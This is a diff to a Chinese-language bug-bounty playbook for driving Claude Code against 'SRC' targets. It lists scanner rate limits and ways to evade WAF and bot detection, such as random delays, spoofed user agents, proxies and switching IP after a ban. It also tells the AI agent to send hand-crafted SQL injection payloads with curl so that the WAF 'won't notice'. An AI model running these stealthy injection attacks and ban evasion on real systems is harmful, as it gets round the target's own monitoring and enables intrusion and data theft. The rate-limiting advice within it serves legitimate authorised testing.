@@ -510,3 +510,80 @@ nuclei -l targets.txt -t claude-hunt/tools/nuclei-templates-cn/ -severity critic
 - 数据库漏洞只读2-3行验证
 - 不用在线XSS平台
 - 最多用2个自己注册的账号
+
+
+
+---
+
+## 工具安全限速参数（对SRC目标必须加）
+
+对SRC授权目标测试时，**所有工具必须加限速参数**，否则会触发WAF/风控/人机验证导致IP被封或账号被追溯。
+
+### 原则：对SRC目标每秒不超过3-5个请求
+
+| 工具 | 默认行为（危险） | SRC安全参数 | 说明 |
+|------|-----------------|-------------|------|
+| **nuclei** | 并发25线程，全模板 | `nuclei -l targets.txt -severity critical,high -rate-limit 5 -c 3` | 只扫高危+限速5/秒+3线程 |
+| **ffuf** | 40线程爆破 | `ffuf -u URL/FUZZ -w dict.txt -t 3 -rate 5 -mc 200,301,302,403` | 3线程+限速5/秒 |
+| **dalfox** | 多worker并发 | `dalfox pipe --worker 2 --delay 300 --timeout 10` | 2worker+每请求延迟300ms |
+| **katana** | 快速爬取 | `katana -u target.com -d 2 -delay 1 -c 3` | 深度2+延迟1秒+3并发 |
+| **httpx** | 50线程探测 | `httpx -l urls.txt -threads 5 -rate-limit 10` | 5线程+限速10/秒 |
+| **naabu** | 快速端口扫描 | `naabu -host target.com -rate 100 -c 10` | 对单目标100/秒足够 |
+| **gau/waybackurls** | 查第三方数据源 | 无需限速 | 不直接请求目标，安全 |
+| **subfinder** | 查第三方数据源 | 无需限速 | 不直接请求目标，安全 |
+| **race_tester.py** | 并发20-50 | `--threads 20` 已硬限制 | 一次测完就停，不反复跑 |
+| **idor_diff.py** | 逐个请求 | 默认安全 | 每个ID只发1个请求 |
+| **browser_auto.py** | 正常浏览速度 | 默认安全 | 和人操作一样 |
+
+### 会触发人机验证的行为
+
+1. **短时间大量404** — ffuf/dirsearch 目录爆破最容易触发
+2. **相同参数大量重复请求** — nuclei 模板扫描
+3. **异常User-Agent** — 默认Go/Python UA容易被识别
+4. **无Cookie/Session的大量请求** — 看起来像爬虫
+5. **非常规请求频率** — 正常人不会1秒点10次
+6. **无头浏览器特征** — navigator.webdriver=true 会被检测
+
+### 如何避免触发
+
+- **加随机延迟** — 每个请求之间随机等0.5-2秒
+- **带正常Cookie** — 先登录获取session再测试
+- **用正常UA** — `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`
+- **通过代理** — Fiddler/Burp代理让流量看起来像正常浏览
+- **分散时间** — 不要集中在一个时间段全部跑完
+- **手工优先** — 对SRC目标，能手工测就手工测
+
+### Claude Code 自动化时的安全策略
+
+当 Claude Code 用 `/hunt` 或 `/autopilot` 时，应该：
+
+1. 先用 `wafw00f` 检测目标是否有WAF
+2. 如果有WAF：所有工具加最严格限速（每秒1-2个请求）
+3. 如果无WAF：可以稍微快一点（每秒5-10个请求）
+4. SQL注入：**不用任何自动化工具**，让AI逐个手工构造payload通过curl发送
+5. 并发测试：一次测完立即停止，不反复验证
+6. 发现被ban（全是403/429）：立即停止，等待或换IP
+
+### SQL注入的正确做法（AI手工注入）
+
+**不要：**
+```bash
+sqlmap -u "http://target.com/page?id=1" --dbs  # ❌ 几百个请求瞬间打过去
+```
+
+**应该：**
+```bash
+# 1. 先判断是否有注入（1个请求）
+curl "http://target.com/page?id=1' AND 1=1--" -H "Cookie: session=xxx"
+
+# 2. 确认后手工构造payload（1个请求）
+curl "http://target.com/page?id=1' UNION SELECT 1,2,3--" -H "Cookie: session=xxx"
+
+# 3. 读取数据库名（1个请求）
+curl "http://target.com/page?id=1' UNION SELECT 1,database(),3--" -H "Cookie: session=xxx"
+
+# 4. 证明存在即可，截图写报告
+# 总共只发了3-4个请求，WAF根本察觉不到
+```
+
+让 Claude Code 帮你构造这些 payload，它比 sqlmap 聪明——能根据报错信息动态调整注入方式，而且每次只发1个请求。
